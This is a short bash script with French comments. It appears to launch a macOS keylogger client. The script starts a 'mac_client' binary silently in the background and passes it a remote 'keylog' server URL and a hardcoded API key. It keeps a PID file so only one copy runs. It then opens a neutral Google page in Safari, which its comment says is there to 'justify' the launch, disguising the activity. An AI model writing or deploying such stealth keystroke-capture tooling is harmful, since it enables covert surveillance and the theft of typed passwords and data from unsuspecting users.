#!/bin/bash

SERVER_URL="https://api.keylog.claverie.site"
API_KEY="72UsPl9QtgelVRbJ44u-G6hcNiSIWx64MEOWcmcCQ"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BIN="$SCRIPT_DIR/mac_client"
PID_FILE="$SCRIPT_DIR/.mac_client.pid"

# Vérifier que le binaire existe
if [ ! -x "$BIN" ]; then
  echo "[X] Binaire introuvable ou non exécutable: $BIN"
  exit 1
fi

# Vérifier si déjà en cours
if [ -f "$PID_FILE" ]; then
  OLD_PID=$(cat "$PID_FILE")
  if ps -p "$OLD_PID" >/dev/null 2>&1; then
    # Déjà lancé, on sort silencieusement
    exit 0
  else
    rm -f "$PID_FILE"
  fi
fi

# Lancer en arrière-plan complètement silencieux
nohup "$BIN" "$SERVER_URL" "$API_KEY" >/dev/null 2>&1 &
PID=$!
echo "$PID" > "$PID_FILE"

# Optionnel : ouvrir une page neutre pour "justifier" le lancement
open -a "Safari" "https://www.google.com" >/dev/null 2>&1 &
exit 0

